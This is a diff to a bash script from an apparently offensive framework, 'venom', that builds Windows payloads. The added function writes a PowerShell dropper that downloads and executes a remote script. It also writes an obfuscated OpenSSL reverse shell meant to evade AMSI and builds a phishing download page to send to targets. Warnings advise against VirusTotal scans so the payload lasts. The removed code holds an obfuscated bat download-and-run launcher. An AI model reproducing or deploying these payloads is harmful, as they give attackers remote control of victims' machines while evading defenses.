@@ -11958,11 +11958,11 @@ cat << !
 
     AGENT Nº2
     ╔──────────────────────────────────────────────────────────────
-    | DESCRIPTION        : Reverse TCP Python Shell
+    | DESCRIPTION        : Reverse OpenSSL Powershell Shell
     | TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
-    | LOLBin             : Powershell (Net.WebClient)
-    | AGENT EXTENSION    : EXE|PY
-    |_DROPPER EXTENSION  : BAT|--
+    | LOLBin             : WinHttpRequest
+    | AGENT EXTENSION    : PS1
+    |_DROPPER EXTENSION  : PS1
 
     ╔─────────────────────────────────────────────────────────────╗
     ║   M    - Return to main menu                                ║
@@ -11993,6 +11993,17 @@ esac
 # ----------------------------------------------
 sh_evasion1 () {
 Colors;
+
+## WARNING ABOUT SCANNING SAMPLES (VirusTotal)
+echo "---"
+echo "- ${YellowF}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
+echo "- Please Dont test samples on Virus Total or on similar"${Reset};
+echo "- online scanners, because that will shorten the payload life."${Reset};
+echo "- And in testings also remmenber to stop the windows defender"${Reset};
+echo "- from sending samples to \$Microsoft.."${Reset};
+echo "---"
+sleep 2
+
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: downloader" --entry --width 300) > /dev/null 2>&1
@@ -12000,7 +12011,7 @@ NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: revshell" --e
 
 ## setting default values in case user have skip this ..
 if [ -z "$lhost" ]; then lhost="$IP";fi
-if [ -z "$lport" ]; then lport="666";fi
+if [ -z "$lport" ]; then lport="443";fi
 if [ -z "$Drop" ]; then Drop="dropper";fi
 if [ -z "$NaM" ]; then NaM="revshell";fi
 
@@ -12099,11 +12110,154 @@ sh_menu
 
 
 # --------------------------------------------------
-# Simple TCP reverse shell in PYTHON compiled to exe
-# Author: @Rel1k (Trusted Sec)
+# Reverse OpenSSL Powershell shell
+# original shell: @int0x33
 # --------------------------------------------------
 sh_evasion2 () {
 Colors;
+
+## WARNING ABOUT SCANNING SAMPLES (VirusTotal)
+echo "---"
+echo "- ${YellowF}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
+echo "- Please Dont test samples on Virus Total or on similar"${Reset};
+echo "- online scanners, because that will shorten the payload life."${Reset};
+echo "- And in testings also remmenber to stop the windows defender"${Reset};
+echo "- from sending samples to \$Microsoft.."${Reset};
+echo "---"
+sleep 2
+
+lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
+lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
+Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: downloader" --entry --width 300) > /dev/null 2>&1
+NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: revshell" --entry --width 300) > /dev/null 2>&1
+
+## setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$Drop" ]; then Drop="dropper";fi
+if [ -z "$NaM" ]; then NaM="revshell";fi
+
+# display final settings to user
+echo "${BlueF}[${YellowF}i${BlueF}]${white} MODULE SETTINGS"${Reset};
+echo ${BlueF}"---"
+cat << !
+    LPORT    : $lport
+    LHOST    : $lhost
+    LOLBin   : WinHttpRequest
+    DROPPER  : $IPATH/output/$Drop.ps1
+    AGENT    : $IPATH/output/$NaM.ps1
+!
+echo "---"
+
+
+## BUILD DROPPER
+echo "${BlueF}[☠]${white} Building Obfuscated ps1 dropper ..${white}";sleep 2
+echo "\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText" > $IPATH/output/$Drop.ps1
+
+
+## Build Reverse Powershell Shell
+echo "${BlueF}[☠]${white} Writting TCP reverse shell to output .."${Reset};
+sleep 2
+echo "<#" > $IPATH/output/$NaM.ps1
+echo "Obfuscated Reverse OpenSSL Shell" >> $IPATH/output/$NaM.ps1
+echo "Framework: venom v1.0.16 (amsi evasion)" >> $IPATH/output/$NaM.ps1
+echo "Original shell: @int0x33" >> $IPATH/output/$NaM.ps1
+echo "#>" >> $IPATH/output/$NaM.ps1
+echo "" >> $IPATH/output/$NaM.ps1
+echo "write-Host \"Please Wait, Executing PS Application ..\" -ForeGroundColor green -BackGroundColor black;" >> $IPATH/output/$NaM.ps1
+echo "\$MethodInvocation = \"tneilCpcT.stekcoS.teN\";\$Constructor = \$MethodInvocation.ToCharArray();[Array]::Reverse(\$Constructor);\$NewObjectCommand = (\$Constructor -Join '');" >> $IPATH/output/$NaM.ps1
+echo "\$assembly = \"gnidocnEiicsA.txeT.metsyS\";\$CmdCharArray = \$assembly.ToCharArray();[Array]::Reverse(\$CmdCharArray);\$PSArgException = (\$CmdCharArray -Join '');" >> $IPATH/output/$NaM.ps1
+echo "" >> $IPATH/output/$NaM.ps1
+echo "\$socket = New-Object \$NewObjectCommand('$lhost', $lport)" >> $IPATH/output/$NaM.ps1
+echo "\$stream = \$socket.GetStream()" >> $IPATH/output/$NaM.ps1
+echo "\$sslStream = New-Object System.Net.Security.SslStream(\$stream,\$false,({\$True} -as [Net.Security.RemoteCertificateValidationCallback]))" >> $IPATH/output/$NaM.ps1
+echo "\$sslStream.AuthenticateAsClient('fake.domain', \$null, \"Tls12\", \$false)" >> $IPATH/output/$NaM.ps1
+echo "        \$writer = new-object System.IO.StreamWriter(\$sslStream)" >> $IPATH/output/$NaM.ps1
+echo "        \$writer.Write((pwd).Path + '> ')" >> $IPATH/output/$NaM.ps1
+echo "        \$writer.flush()" >> $IPATH/output/$NaM.ps1
+echo "        [byte[]]\$bytes = 0..65535|%{0};" >> $IPATH/output/$NaM.ps1
+echo "" >> $IPATH/output/$NaM.ps1
+echo "while((\$i = \$sslStream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){" >> $IPATH/output/$NaM.ps1
+echo "   \$data = (New-Object -TypeName \$PSArgException).GetString(\$bytes,0, \$i);" >> $IPATH/output/$NaM.ps1
+echo "   \$sendback = (iex \$data | Out-String ) 2>&1;" >> $IPATH/output/$NaM.ps1
+echo "   \$sendback2 = \$sendback + (pwd).Path + '> ';" >> $IPATH/output/$NaM.ps1
+echo "   \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);" >> $IPATH/output/$NaM.ps1
+echo "   \$sslStream.Write(\$sendbyte,0,\$sendbyte.Length);\$sslStream.Flush()" >> $IPATH/output/$NaM.ps1
+echo "}" >> $IPATH/output/$NaM.ps1
+
+
+
+## Generate SSL certificate
+cd $IPATH/output
+echo "${BlueF}[☠]${white} Building SSL certificate (openssl) .."${Reset};sleep 2
+xterm -T " Building SSL certificate " -geometry 110x23 -e "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes"
+echo "${BlueF}[${GreenF}✔${BlueF}]${white} venom-main/output/key.pem + cert.pem ([${GreenF}OK${white}])${white} ..";sleep 1
+cd $IPATH
+
+
+## Building Phishing webpage
+cd $IPATH/templates/phishing
+echo "${BlueF}[☠]${white} Building HTTP Download WebPage (apache2) .."${Reset};sleep 2
+sed "s|NaM3|http://$lhost/$Drop.zip|g" mega.html > mega1.html
+mv mega1.html $ApAcHe/mega1.html > /dev/nul 2>&1
+cd $IPATH
+
+
+## Copy files to apache2 webroot
+cd $IPATH/output
+zip $Drop.zip $Drop.ps1 > /dev/nul 2>&1
+echo "${BlueF}[☠]${white} Porting ALL required files to apache2 .."${Reset};sleep 2
+cp $IPATH/output/$NaM.ps1 $ApAcHe/$NaM.ps1 > /dev/nul 2>&1
+cp $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1
+cd $IPATH
+
+
+
+## Print attack vector on terminal
+echo "${BlueF}[${GreenF}✔${BlueF}]${white} Starting apache2 webserver ..";sleep 2
+echo "${BlueF}---"
+echo "- ${YellowF}SEND THE URL GENERATED TO TARGET HOST${white}"
+echo "${BlueF}- ATTACK VECTOR: http://$lhost/mega1.html"
+echo "${BlueF}---"${Reset};
+echo -n "${BlueF}[☠]${white} Press any key to start a handler .."
+read odf
+rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
+## START HANDLER
+cd $IPATH/output
+xterm -T " OPENSSL LISTENER - $lhost:$lport" -geometry 110x23 -e "openssl s_server -quiet -key key.pem -cert cert.pem -port $lport"
+cd $IPATH
+sleep 2
+
+
+## Clean old files
+echo "${BlueF}[☠]${white} Please Wait,cleaning old files ..${white}";sleep 2
+rm $ApAcHe/$NaM.ps1 > /dev/nul 2>&1
+rm $ApAcHe/$Drop.zip > /dev/nul 2>&1
+rm $ApAcHe/mega1.html > /dev/nul 2>&1
+rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
+rm $IPATH/output/cert.pem > /dev/nul 2>&1
+rm $IPATH/output/key.pem > /dev/nul 2>&1
+sh_menu
+}
+
+
+
+
+
+
+sh_evasion3 () {
+Colors;
+
+## WARNING ABOUT SCANNING SAMPLES (VirusTotal)
+echo "---"
+echo "- ${YellowF}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
+echo "- Please Dont test samples on Virus Total or on similar"${Reset};
+echo "- online scanners, because that will shorten the payload life."${Reset};
+echo "- And in testings also remmenber to stop the windows defender"${Reset};
+echo "- from sending samples to \$Microsoft.."${Reset};
+echo "---"
+sleep 2
+
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 NaM=$(zenity --title="☠ Enter FILENAME ☠" --text "example: Rel1k" --entry --width 300) > /dev/null 2>&1
@@ -12256,121 +12410,6 @@ xterm -T " NETCAT LISTENER - $lhost:$lport" -geometry 110x23 -e "sudo nc -lvp $l
 ## Clean old files
 echo "${BlueF}[☠]${white} Please Wait,cleaning old files .."${Reset};sleep 2
 rm $ApAcHe/$NaM.exe > /dev/nul 2>&1
-rm $ApAcHe/$NaM.bat > /dev/nul 2>&1
-rm $ApAcHe/mega1.html > /dev/nul 2>&1
-sh_menu
-}
-
-
-# -------------------------------------------
-# Simple TCP reverse shell in PS1 (agent.ps1)
-# -------------------------------------------
-sh_evasion3 () {
-Colors;
-lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
-lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
-NaM=$(zenity --title="☠ Enter FILENAME ☠" --text "example: notepad" --entry --width 300) > /dev/null 2>&1
-
-
-## setting default values in case user have skip this ..
-if [ -z "$lhost" ]; then lhost="$IP";fi
-if [ -z "$lport" ]; then lport="443";fi
-if [ -z "$NaM" ]; then NaM="notepad";fi
-
-## display final settings to user
-echo "${BlueF}[${YellowF}i${BlueF}]${white} MODULE SETTINGS"${Reset};
-echo ${BlueF}"---"
-cat << !
-    LPORT    : $lport
-    LHOST    : $lhost
-    LOLBin   : powershell DownloadFile()
-    DROPPER  : $IPATH/output/$NaM.bat
-    AGENT    : $IPATH/output/$NaM.ps1
-!
-echo "---${white}"
-
-
-## parsing ip addr ranges into fields (payload.ps1)
-echo "${BlueF}[☠]${white} parsing ip addr ranges into fields .."${Reset};sleep 2
-sleep 2
-one=$(echo $lhost|cut -d '.' -f1)
-two=$(echo $lhost|cut -d '.' -f2)
-tre=$(echo $lhost|cut -d '.' -f3)
-four=$(echo $lhost|cut -d '.' -f4)
-# split ip addr into 2 fields (launcher.bat)
-splt1=$(echo $lhost | cut -d '.' -f1,2)
-splt2=$(echo $lhost | cut -d '.' -f3,4)
-
-## convert all ip ranges fields into hex (payload.ps1)
-echo "${BlueF}[☠]${white} convert ip ranges fields into hex .."${Reset};sleep 2
-loot=$(printf "%x,%x,%x,%x\n" $one $two $tre $four)
-echo "${BlueF}[${YellowF}i${BlueF}]${white} ip${RedF}:${white}$lhost ${YellowF}=>${white} hex${RedF}:${white}$loot"${Reset};
-sleep 2
-
-## parsing hex fields (payload.ps1)
-um=$(echo $loot|cut -d ',' -f1)
-dois=$(echo $loot|cut -d ',' -f2)
-frt=$(echo $loot|cut -d ',' -f3)
-qua=$(echo $loot|cut -d ',' -f4)
-
-
-## inject obfuscated (hex) ip addr into template (payload.ps1)
-echo "${BlueF}[☠]${white} inject obfuscated (hex) addr into payload .."${Reset};sleep 2
-cd $IPATH/templates/evasion4
-cp powershell.ps1 powershell.bak
-sed -i "s|rEp|$um|" powershell.ps1
-sed -i "s|Ola|$dois|" powershell.ps1
-sed -i "s|DoI|$frt|" powershell.ps1
-sed -i "s|Fif|$qua|" powershell.ps1
-sed -i "s|PoRt|$lport|" powershell.ps1
-
-
-## copy files to output folder
-mv $IPATH/templates/evasion4/powershell.ps1 $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
-mv powershell.bak powershell.ps1 > /dev/nul 2>&1
-
-
-## LAUNCHER (launcher.bat)
-echo "${BlueF}[☠]${white} Building Obfuscated bat Launcher .."${Reset};sleep 2
-# echo "@echo off&&powershell IEX (New-Object Net.WebClient).DownloadString('http://$lhost/$NaM.ps1')" > $IPATH/output/$NaM.bat
-# echo "@echo off&&certutil.exe -urlcache -split -f http://$lhost/$NaM.ps1 $NaM.ps1 && start $NaM.ps1" > $IPATH/output/$NaM.bat
-# $proxy=new-object -com WinHttp.WinHttpRequest.5.1;$proxy.open('GET','http://$lhost/$NaM.ps1',$false);$proxy.send();powershell -C "[char]73+[char]69+[char]88";$proxy.responseText;Start-Process -FilePath "./$NaM.ps1" -Wait -WindowStyle Minimized
-## Obfuscated bat launcher
-echo "@e%!%ch^O ,;, Of^f&&(,(,, =power%i0%shell -w 1 -C (New-Object Net.WebClient).Down%buffer%loadString('http://$lhost/$NaM.ps1')), %i%)" > $IPATH/output/$NaM.bat
-
-
-
-
-## Copy files to apache2 webroot
-echo "${BlueF}[☠]${white} Copy files required to apache webroot .."${Reset};sleep 2
-cp $IPATH/output/$NaM.ps1 $ApAcHe/$NaM.ps1 > /dev/nul 2>&1
-cp $IPATH/output/$NaM.bat $ApAcHe/$NaM.bat > /dev/nul 2>&1
-
-
-## Phishing webpage
-cd $IPATH/templates/phishing
-echo "${BlueF}[☠]${white} Building Downloader webpage .."${Reset};sleep 2
-sed "s|NaM3|http://$lhost/$NaM.bat|g" mega.html > mega1.html
-mv mega1.html $ApAcHe/mega1.html > /dev/nul 2>&1
-cd $IPATH
-
-
-
-## Print attack vector on terminal
-echo "${BlueF}[${GreenF}✔${BlueF}]${white} Starting apache2 webserver ..";sleep 2
-echo "${BlueF}---"
-echo "- ${YellowF}SEND THE URL GENERATED TO TARGET HOST${white}"
-echo "${BlueF}- ATTACK VECTOR: http://$lhost/mega1.html"
-echo "${BlueF}---"${Reset};
-echo -n "${BlueF}[☠]${white} Press any key to start a handler .."
-read odf
-## START HANDLER
-xterm -T " NETCAT LISTENER - $lhost:$lport" -geometry 110x23 -e "sudo nc -lnvp $lport"
-
-
-## Clean old files
-echo "${BlueF}[☠]${white} Please Wait,cleaning old files .."${Reset};sleep 2
-rm $ApAcHe/$NaM.ps1 > /dev/nul 2>&1
 rm $ApAcHe/$NaM.bat > /dev/nul 2>&1
 rm $ApAcHe/mega1.html > /dev/nul 2>&1
 sh_menu
